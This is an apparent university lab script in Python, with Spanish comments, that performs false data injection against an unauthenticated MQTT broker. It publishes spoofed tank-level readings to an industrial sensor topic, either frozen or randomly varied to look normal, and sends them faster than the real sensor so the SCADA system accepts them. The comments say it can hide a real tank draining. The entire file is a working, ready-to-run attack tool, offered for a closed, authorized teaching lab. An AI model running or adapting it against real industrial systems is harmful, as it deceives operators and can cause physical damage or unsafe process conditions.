#!/usr/bin/env python3
"""
SSI - TP IoT/IIoT - Grupo 18
Inyeccion / spoofing de lecturas de sensor (false data injection).

Uso previsto: laboratorio cerrado y propio, con autorizacion.

Escenario: en un broker sin autenticacion, el atacante publica en el
mismo topic que el sensor real. El SCADA/operador recibe valores
falsos y toma decisiones erroneas (ej: cree que el tanque esta a un
nivel seguro cuando no lo esta, o dispara una parada innecesaria).
Esto ilustra el impacto sobre la INTEGRIDAD y la DISPONIBILIDAD del
proceso, no solo la confidencialidad.

Este es el tipo de ataque "false data injection" documentado en la
literatura de seguridad industrial (ICS/SCADA).

Ejecutar:
  # Mantener el nivel congelado en 80% (oculta un vaciado real):
  python spoof_sensor.py --host 192.168.1.100 --mode fixed --value 80

  # Oscilar valores plausibles para que parezca normal:
  python spoof_sensor.py --host 192.168.1.100 --mode noise
"""
import argparse
import random
import time

import paho.mqtt.client as mqtt

TOPIC_NIVEL = "planta/lineaA/tanque1/nivel"


def main():
    ap = argparse.ArgumentParser(description="Spoofing de sensor MQTT (lab)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--mode", choices=["fixed", "noise"], default="fixed")
    ap.add_argument("--value", type=int, default=80,
                    help="nivel fijo a inyectar (modo fixed)")
    ap.add_argument("--rate", type=float, default=1.0,
                    help="segundos entre publicaciones (mas rapido que el "
                         "sensor real para ganar la 'carrera')")
    args = ap.parse_args()

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                         client_id="spoofer-lab")
    client.connect(args.host, args.port, keepalive=60)
    client.loop_start()

    print(f"[+] Inyectando lecturas falsas en {TOPIC_NIVEL} "
          f"(modo={args.mode}). Ctrl-C para parar.")
    try:
        while True:
            if args.mode == "fixed":
                nivel = args.value
            else:
                nivel = random.randint(70, 85)
            payload = f'{{"nivel":{nivel},"cm":12.0,"ts":{int(time.time()*1000)}}}'
            # Publicamos mas seguido que el sensor real: el ultimo mensaje
            # que llega al SCADA suele ser el nuestro.
            client.publish(TOPIC_NIVEL, payload)
            print(f"    -> {payload}")
            time.sleep(args.rate)
    except KeyboardInterrupt:
        print("\n[fin]")
        client.loop_stop()


if __name__ == "__main__":
    main()
